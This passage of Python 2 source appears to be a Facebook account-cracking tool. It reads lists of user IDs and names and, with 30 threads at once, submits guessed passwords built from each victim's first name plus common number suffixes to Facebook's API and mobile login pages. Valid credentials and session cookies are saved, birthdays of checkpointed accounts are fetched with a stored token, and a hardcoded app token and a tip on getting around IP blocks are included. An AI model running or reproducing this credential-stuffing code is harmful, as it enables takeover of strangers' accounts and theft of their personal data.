        print '%s[%s\x1b[1;91m\xc3\x97%s] Cant be empty Kentod' % (N, M, N)
        time.sleep(2)
        seting_yntkts()
    elif ytbjts == '1':
        agent_user()
    elif ytbjts == '2':
        agent_chek()
    else:
        print '%s[%s\x1b[1;91m\xc3\x97%s] Correct input' % (N, M, N)
        time.sleep(2)
        seting_yntkts()


def agent_user():
    os.system('rm -rf mking.txt')
    os.system('clear')
    print logo
    print '%s[%s\x1b[1;92m\xe2\x80\xa2%s] Notice me : cari User Agent di google chrome.' % (N, O, N)
    print '[%s\x1b[1;92m\xc3\x97%s] Type User Agent or My User Agent....\n' % (M, N)
    print '\x1b[1;97m-------------------------------------------------'
    anjng = raw_input(' [%s\x1b[1;92m?%s] Enter User Agent :\x1b[1;92m%s ' % (O, N, H))
    if anjng == '':
        print '%s[%s\x1b[1;91m\xc3\x97%s] Kentod cannot be empty' % (N, M, N)
        agent_user()
    try:
        open('mking.txt', 'w').write(anjng)
        time.sleep(2)
        jalan('%s[%s\x1b[1;92m\xe2\x9c\x93%s] successfully changed the user agent...' % (N, H, N))
        raw_input('%s[ %sRETURN%s ]' % (N, O, N))
        menu()
    except:
        pass


def agent_chek():
    try:
        user_agent = open('mking.txt', 'r').read()
    except IOError:
        user_agent = '%s-' % M
    except:
        pass

    print '%s[%s\x1b[0;92m+%s] Your User Agent: %s%s' % (N, O, N, H, user_agent)
    raw_input('%s[ %sRETURN%s ]' % (N, O, N))
    menu()


class __crack__():

    def __init__(self):
        self.id = []

    def plerr(self):
        os.system('clear')
        print logo
        try:
            self.apk = raw_input('[%s\x1b[1;92m?%s] Input file : \x1b[1;92m' % (O, N))
            self.id = open(self.apk).read().splitlines()
            print '[%s\x1b[1;92m+%s] Total id -> \x1b[1;92m%s%s%s' % (O, N, M, len(self.id), N)
            print '\x1b[1;97m-------------------------------------------------'
        except:
            print '%s[%s\x1b[1;91m%s] File [%s%s%s] No, extract id first bro check numbers 1 to 4' % (N, M, N, M, self.apk, N)
            time.sleep(3)
            raw_input('%s[ %sRETURN%s ]' % (N, O, N))
            menu()

        print '[\x1b[1;32m 1 \x1b[1;37m] TOOL PASSWORD'
        print '\x1b[1;97m-------------------------------------------------'
        ___mking__pass___ = raw_input('[%s\x1b[1;92m?%s] CHOOSE: ' % (O, N))
        if ___mking__pass___ in ('2', '02'):
            print '%s[%s\x1b[1;91m!%s] use , (comma) for separator example: password123,password12345,etc. each word is at least 6 characters or more' % (N, M, N)
            print '\x1b[1;97m-------------------------------------------------'
            while True:
                pwek = raw_input('[%s\x1b[1;92m?%s] Enter password : \x1b[1;92m' % (O, N))
                print '\x1b[1;97m-------------------------------------------------'
                print ' [*] Crack with password -> [ %s%s%s ]' % (M, pwek, N)
                print '\x1b[1;97m-------------------------------------------------'
                if pwek == '':
                    print '%s[%s\x1b[1;91m\xc3\x97%s] dont empty the password ' % (N, M, N)
                elif len(pwek) <= 5:
                    print '%s[%s\x1b[1;91m\xc3\x97%s] Password minimum 6 characters' % (N, M, N)
                else:

                    def __yan__(ysc=None):
                        global cp
                        global ok
                        cin = raw_input('[\x1b[1;92m*\x1b[1;97m] method : \x1b[1;92m')
                        print '\x1b[1;97m-------------------------------------------------'
                        if cin == '':
                            print '%s[%s\x1b[1;91m\xc3\x97%s] dont be empty bro' % (N, M, N)
                            self.__yan__()
                        elif cin == '1':
                            with mking__pass(max_workers=30) as (__mking__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        __mking__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            seved_ok_cp(ok, cp)
                        elif cin == '2':
                            with mking__pass(max_workers=30) as (__mking__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        __mking__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            seved_ok_cp(ok, cp)
                        elif cin == '3':
                            with mking__pass(max_workers=30) as (__mking__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('|')[0]
                                        __mking__.submit(self.__mfb, __, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            seved_ok_cp(ok, cp)
                        else:
                            print '%s[%s\x1b[1;91m\xc3\x97%s] correct input' % (N, M, N)
                            self.__yan__()

                    print '\x1b[1;97m-------------------------------------------------'
                    print '[%s\x1b[1;92m1%s] NEW API ( VERY FAST )' % (O, N)
                    print '\x1b[1;97m-------------------------------------------------'
                    __yan__(pwek.split(','))
                    break

        elif ___mking__pass___ in ('1', '01'):
            print '\x1b[1;97m-------------------------------------------------'
            print '[%s\x1b[1;92m1%s] NEW API ( VERY FAST )' % (O, N)
            print '\x1b[1;97m-------------------------------------------------'
            self.__pler__()
        else:
            print '%s[%s\x1b[1;91m\xc3\x97%s] y/t goblok!' % (N, M, N)
            time.sleep(2)
            menu()
        return

    def __api__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r%s%s ( + ) TEST: %s OF %s  \x1b[1;92mOK\x1b[1;97m:\x1b[1;92m %s + \x1b[1;93mCP\x1b[1;97m:\x1b[1;93m %s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('saved')
            except:
                pass

            try:
                _sultani = open('mking.txt', 'r').read()
            except (KeyError, IOError):
                _sultani = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _sultani, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if response.status_code != 200:
                (sys.stdout.write('\r%s[%s\x1b[1;91m!%s] IP blocked turn on airplane mode 5 seconds' % (N, M, N)),)
                sys.stdout.flush()
                loop += 1
                self.__api__()
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r%s[ OK ] %s : %s   %s' % (H, user, pw, N)
                wrt = ' [\xe2\x9c\x93] %s|%s' % (user, pw)
                ok.append(wrt)
                open('saved/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    sultani = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, sultani)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[ CP ] %s : %s | %s %s %s%s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[ CP ] %s : %s %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92mMR\xe2\x99\xa1SULTANI%s] [crack] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('saved')
            except:
                pass

            try:
                _sultani = open('mking.txt', 'r').read()
            except (KeyError, IOError):
                _sultani = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _sultani, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[MKING-OK] %s | %s | %s %s' % (H, user, pw, kuki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('saved/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    sultani = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, sultani)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[MKING-CP] %s | %s | %s %s %s %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[MKING-CP] %s | %s %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mfb__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92mR\xe2\x99\xa1S%s] [crack] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('saved')
            except:
                pass

            try:
                _sultani = open('mking.txt', 'r').read()
            except (KeyError, IOError):
                _sultani = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _sultani, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com')
            b = ses.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[MKING-OK] %s|%s|%s %s' % (H, user, pw, kuki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('saved/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    sultani = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, sultani)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[MKING-CP] %s | %s | %s %s %s %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[MKING-CP] %s|%s %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __pler__(self):
        yan = raw_input('[*] method : ')
        print '\x1b[1;97m-------------------------------------------------'
        if yan == '':
            print '%s[%s\x1b[1;91m\xc3\x97%s] dont be empty bro' % (N, M, N)
            self.__pler__()
        elif yan in ('1', '01'):
            with mking__pass(max_workers=30) as (__mking__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1122', xz[0] + '112233', xz[0] + '1122334455', xz[0]  + '1234', xz[0] + '123321', xz[0] + '100200', xz[0] + '12344321', xz[0] + '1999', xz[0] + '2000', xz[0] + '123456789', xz[0] + '112233445566', xz[0] + '11223344', xz[0] + '1234554321', xz[0] + '123456', xz[0] + '1990', xz[0] + '1212', xz[0] + '123123', xz[0] + '786', xz[0] + '100200300', xz[0] + '2007', xz[0] + '112233332211', xz[0] + '2003', xz[0] + '54321', xz[0] + '321', xz[0] + '2001', xz[0] + '2002', xz[0] + '2004', xz[0] + '2005', xz[0] + '2006', xz[0] + '2010', xz[0] + '4321', xz[0] + '12345@', xz[0] + '123$', xz[0] + '12345$', xz[0] + '987654321', xz[0] + '102030']
                        else:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1122', xz[0] + '112233', xz[0] + '1122334455', xz[0]  + '1234', xz[0] + '123321', xz[0] + '100200', xz[0] + '12344321', xz[0] + '1999', xz[0] + '2000', xz[0] + '123456789', xz[0] + '112233445566', xz[0] + '11223344', xz[0] + '1234554321', xz[0] + '123456', xz[0] + '1990', xz[0] + '1212', xz[0] + '123123', xz[0] + '786', xz[0] + '100200300', xz[0] + '2007', xz[0] + '112233332211', xz[0] + '2003', xz[0] + '54321', xz[0] + '321', xz[0] + '2001', xz[0] + '2002', xz[0] + '2004', xz[0] + '2005', xz[0] + '2006', xz[0] + '2010', xz[0] + '4321', xz[0] + '12345@', xz[0] + '123$', xz[0] + '12345$', xz[0] + '987654321', xz[0] + '102030']
                        __mking__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            seved_ok_cp(ok, cp)
        elif yan in ('2', '02'):
            with mking__pass(max_workers=30) as (__mking__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1122', xz[0] + '112233', xz[0] + '1122334455', xz[0]  + '1234', xz[0] + '123321', xz[0] + '100200', xz[0] + '12344321', xz[0] + '1999', xz[0] + '2000', xz[0] + '123456789', xz[0] + '112233445566', xz[0] + '11223344', xz[0] + '1234554321', xz[0] + '123456', xz[0] + '1990', xz[0] + '1212', xz[0] + '123123', xz[0] + '786', xz[0] + '100200300', xz[0] + '2007', xz[0] + '112233332211', xz[0] + '2003', xz[0] + '54321', xz[0] + '321', xz[0] + '2001', xz[0] + '2002', xz[0] + '2004', xz[0] + '2005', xz[0] + '2006', xz[0] + '2010', xz[0] + '4321', xz[0] + '12345@', xz[0] + '123$', xz[0] + '12345$', xz[0] + '987654321', xz[0] + '102030']
                        else:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1122', xz[0] + '112233', xz[0] + '1122334455', xz[0]  + '1234', xz[0] + '123321', xz[0] + '100200', xz[0] + '12344321', xz[0] + '1999', xz[0] + '2000', xz[0] + '123456789', xz[0] + '112233445566', xz[0] + '11223344', xz[0] + '1234554321', xz[0] + '123456', xz[0] + '1990', xz[0] + '1212', xz[0] + '123123', xz[0] + '786', xz[0] + '100200300', xz[0] + '2007', xz[0] + '112233332211', xz[0] + '2003', xz[0] + '54321', xz[0] + '321', xz[0] + '2001', xz[0] + '2002', xz[0] + '2004', xz[0] + '2005', xz[0] + '2006', xz[0] + '2010', xz[0] + '4321', xz[0] + '12345@', xz[0] + '123$', xz[0] + '12345$', xz[0] + '987654321', xz[0] + '102030']
                        __mking__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            seved_ok_cp(ok, cp)
        elif yan in ('3', '03'):
            with mking__pass(max_workers=30) as (__mking__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1122', xz[0] + '112233', xz[0] + '1122334455', xz[0]  + '1234', xz[0] + '123321', xz[0] + '100200', xz[0] + '12344321', xz[0] + '1999', xz[0] + '2000', xz[0] + '123456789', xz[0] + '112233445566', xz[0] + '11223344', xz[0] + '1234554321', xz[0] + '123456', xz[0] + '1990', xz[0] + '1212', xz[0] + '123123', xz[0] + '786', xz[0] + '100200300', xz[0] + '2007', xz[0] + '112233332211', xz[0] + '2003', xz[0] + '54321', xz[0] + '321', xz[0] + '2001', xz[0] + '2002', xz[0] + '2004', xz[0] + '2005', xz[0] + '2006', xz[0] + '2010', xz[0] + '4321', xz[0] + '12345@', xz[0] + '123$', xz[0] + '12345$', xz[0] + '987654321', xz[0] + '102030']
                        else:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1122', xz[0] + '112233', xz[0] + '1122334455', xz[0]  + '1234', xz[0] + '123321', xz[0] + '100200', xz[0] + '12344321', xz[0] + '1999', xz[0] + '2000', xz[0] + '123456789', xz[0] + '112233445566', xz[0] + '11223344', xz[0] + '1234554321', xz[0] + '123456', xz[0] + '1990', xz[0] + '1212', xz[0] + '123123', xz[0] + '786', xz[0] + '100200300', xz[0] + '2007', xz[0] + '112233332211', xz[0] + '2003', xz[0] + '54321', xz[0] + '321', xz[0] + '2001', xz[0] + '2002', xz[0] + '2004', xz[0] + '2005', xz[0] + '2006', xz[0] + '2010', xz[0] + '4321', xz[0] + '12345@', xz[0] + '123$', xz[0] + '12345$', xz[0] + '987654321', xz[0] + '102030']
                        __mking__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            seved_ok_cp(ok, cp)
        else:
            print '%s[%s\x1b[1;91m\xc3\x97%s] correct input' % (N, M, N)
            self.__pler__()


if __name__ == '__main__':
    os.system('git pull')
    menu()
